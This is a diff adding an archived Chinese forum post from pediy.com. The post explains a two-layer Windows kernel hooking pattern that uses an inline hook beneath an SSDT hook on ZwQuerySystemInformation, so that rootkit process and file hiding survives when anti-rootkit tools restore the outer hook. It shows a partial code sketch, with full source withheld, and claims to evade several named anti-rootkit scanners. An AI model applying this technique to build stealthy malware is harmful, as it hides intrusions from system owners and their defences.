@@ -1,0 +1,61 @@
+
+# 谈谈对于 SSDT 中的 API 进行双层 HOOK 的通用处理模式
+
+> 原文：[`www.pediy.com/kssd/pediy10/64798.html`](https://www.pediy.com/kssd/pediy10/64798.html)
+
+HOOK 的确是门艺术，`在对抗中求生存`，感觉很好。。。
+
+此处，只是说一下处理是的思路，不提供完整源码
+
+代码:
+
+```
+//谈谈对于 SSDT 中的 API 进行双层 HOOK 的通用处理模式,示例代码:
+  // 双层 HOOK: 1.在不存在 SSDT HOOK 的情况下先安装 Inline HOOK
+  ...
+  SetInLineHookZwQueryDirectoryFile();
+  SetInLineHookZwQuerySystemInformation();
+  // 双层 HOOK: 2.再安装外层的 SSDT HOOK,这样时即使本 HOOK 被其他工具恢复,内层的 HOOK 依然在工作着
+  InHookSSDTNativeAPI();
+  ...
+//////////////////////////////////////////////////////////////////////////////
+   .....................
+////////////////////// Do any thing ////////////////////////////////////////////
+  // 进行进程隐藏
+  if(NT\_SUCCESS(ntStatus))
+  {   ZWQUERYSYSTEMINFORMATION TempCheckInSSDTSpace=(ZWQUERYSYSTEMINFORMATION)SYSTEMSERVICE(ZwQuerySystemInformation);
+    // 检测自己的 SSDT HOOK 是否存在,避免重复工作; 当然若一定要重复工作也可以,
+    // 不会引起 BSOD; 这说明代码写的健壮 ^-^.
+    if(HookSSDTZwQuerySystemInformation!=TempCheckInSSDTSpace)
+    {   // 当自己的 SSDT HOOK 被摘除时, 让 Inline Hook 继续替代工作
+      //if(0x81000000 > (ULONG)TempCheckInSSDTSpace) 
+      HideFileFromZwQuerySystemInformation(SystemInformationClass,SystemInformation);
+      if (TempCheckInSSDTSpace != OldZwQuerySystemInformation)
+      {   // 若检测自己是 Inline Hook 到了 SSDT 的深层空间,则需要检测 KIRQL,再进行相应处理
+          // 以避免不必要的 BSOD 发生!
+        if(DISPATCH\_LEVEL >= KeGetCurrentIrql())
+        //    此时不宜太占用太多 CPU 时间,如果是在 safemon.sys 的 HOOK 分发函数中,
+          //可能将系统资源耗尽. 可以连 SMM 的 SSDT HOOK 也不放过,让 Inline Hook 经得起各种
+        //恶劣环境的考验^-^
+          DbgPrint("Rootkit: Hook Inline ZwQuerySystemInformation() Worked ok!\n");
+          // 输出调试信息,证明自己正在干事.
+      }
+      else
+      {
+          DbgPrint("Rootkit: Hook Inline ZwQuerySystemInformation() Worked ok!\n");
+          // 输出调试信息,证明自己正在干事.
+      }     
+    }
+    else
+    {
+      DbgPrint("Rootkit: SSDT HOOK ZwQuerySystemInformation is exist, Inline Hook not need to do any thing any more!\n");
+    }
+  }
+////////////////////// Do any thing ////////////////////////////////////////////
+```
+
+自己也做了个过 `RKU`,`IceSword 1.22`,`SnipeSword`,`wsyscheck0223` 的动画，有与体积太大将近 5M，也就不传上来了，免得浪费论坛资源。
+
+## 上传的附件
+
+| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) || 谈谈对于 SSDT 中的 API 进行双层 HOOK 的通用处理模式.rar  |
